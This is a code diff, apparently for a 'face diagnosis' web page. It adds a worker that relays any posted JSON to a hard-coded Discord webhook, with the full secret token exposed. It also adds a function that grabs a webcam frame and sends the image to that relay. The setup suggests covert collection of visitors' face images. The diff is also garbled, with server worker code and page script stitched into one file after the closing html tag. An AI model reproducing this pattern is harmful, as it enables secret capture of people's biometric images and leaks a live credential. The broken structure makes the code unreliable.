@@ -25,18 +25,49 @@ function takePhoto(){
 </script>
 
 </body>
-</html>
-const webhook = "https://discord.com/api/webhooks/1483434420659556353/MkPBOHoK0U8xRhk2XekAza9RpTwCfRJYb4Y0L3YrdoTVoQgTB6doyq5l6509pTXnYoY3";
+export default {
+  async fetch(request) {
 
-fetch(webhook, {
-  method: "POST",
-  body: JSON.stringify({
-    content: "顔診断の画像",
-    embeds: [{
-      image: { url: image }
-    }]
-  }),
-  headers: {
-    "Content-Type": "application/json"
+    const webhook = "https://discord.com/api/webhooks/1483434420659556353/MkPBOHoK0U8xRhk2XekAza9RpTwCfRJYb4Y0L3YrdoTVoQgTB6doyq5l6509pTXnYoY3";
+
+    const data = await request.json();
+
+    await fetch(webhook,{
+      method:"POST",
+      headers:{
+        "Content-Type":"application/json"
+      },
+      body: JSON.stringify(data)
+    });
+
+    return new Response("ok");
   }
+}
+function takePhoto(){
+
+const canvas = document.getElementById("photo");
+const ctx = canvas.getContext("2d");
+
+canvas.width = 300;
+canvas.height = 300;
+
+ctx.drawImage(video,0,0,300,300);
+
+const image = canvas.toDataURL("image/png");
+
+fetch("https://face-send.worker.dev",{
+ method:"POST",
+ headers:{
+  "Content-Type":"application/json"
+ },
+ body:JSON.stringify({
+  content:"顔診断の画像",
+  embeds:[{
+   image:{url:image}
+  }]
+ })
 });
+
+alert("送信しました");
+
+}
